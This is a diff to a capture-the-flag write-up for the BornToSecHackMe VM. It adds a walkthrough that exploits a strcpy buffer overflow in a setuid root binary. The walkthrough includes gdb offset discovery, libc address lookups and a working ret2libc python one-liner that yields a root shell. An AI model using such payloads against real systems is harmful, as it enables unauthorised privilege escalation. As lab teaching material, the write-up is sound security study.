@@ -752,9 +752,9 @@ thor@BornToSecHackMe:~$ id
 uid=1004(thor) gid=1004(thor) groups=1004(thor)
 ```
 
-# zaz's turtle
+# thor's turtle
 
-The home directory of the "zaz" user contains a file `turtle` that contains a sequence of commands to move a turtle on a grid.
+The home directory of the `thor` user contains a file `turtle` that contains a sequence of commands to move a turtle on a grid.
 
 ```
 thor@BornToSecHackMe:~$ ls
@@ -787,4 +787,78 @@ So the password for the `zaz` user is `646da671ca01bb5d84dbb5fb2238dc8e`.
 ```
 zaz@BornToSecHackMe:~$ id
 uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
+```
+
+It contains an `exploit_me` file and a `mail` directory. We launched, it doesn't do anything, let's open it with `binaryninja`. The program looks vulnerable to a buffer overflow.
+
+```
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+```
+
+```
+080483f4    int32_t main(int32_t argc, char** argv, char** envp)
+08048404        if (argc s<= 1)
+08048406            return 1
+08048406        
+08048420        char str[0x80]
+08048420        strcpy(&str, argv[1])
+0804842c        puts(&str)
+08048431        return 0
+```
+
+```
+zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+```
+
+The offset to the `eip` is `140`. Let's do a `ret2libc` !
+
+```
+(gdb) p system
+$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$3 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) info proc map
+process 9894
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fda000 0xb7fdd000     0x3000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+0xb7f8cc58
+```
+
+We need to overwrite the `eip` with the address of the `system` function, followed by the address of the `exit` function and the address of the `/bin/sh` string.
+```
+./exploit_me $(python -c 'print(b"A" * 140 + b"\xb7\xe6\xb0\x60"[::-1] + b"\xb7\xe5\xeb\xe0"[::-1] + b"\xb7\xf8\xcc\x58"[::-1])')
+```
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print(b"A" * 140 + b"\xb7\xe6\xb0\x60"[::-1] + b"\xb7\xe5\xeb\xe0"[::-1] + b"\xb7\xf8\xcc\x58"[::-1])')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# whoami
+root
 ```
